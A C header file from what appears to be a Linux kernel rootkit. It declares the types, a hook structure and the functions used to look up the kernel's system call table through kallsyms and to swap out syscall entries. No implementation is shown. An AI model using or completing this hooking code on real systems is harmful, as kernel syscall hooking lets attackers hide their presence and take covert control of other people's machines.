#ifndef _ROOTKIT_HOOKING_H_
#define _ROOTKIT_HOOKING_H_

#define KALLSYMS_NAME "kallsyms_lookup_name"
#define SYS_CALL_TABLE_NAME "sys_call_table"

typedef void *(*kallsyms_t)(const char *s_name);
typedef long (*sysfun_t)(struct pt_regs *p_regs);

typedef struct hook_tag {
	const char *s_name;
	sysfun_t old_sysfun;
	sysfun_t new_sysfun;
} hook_t;

int init_hooking(void);
sysfun_t get_syscall_entry(size_t sz_syscall_nr);
void set_syscall_entry(size_t sz_syscall_nr, sysfun_t new_sysfun);

#endif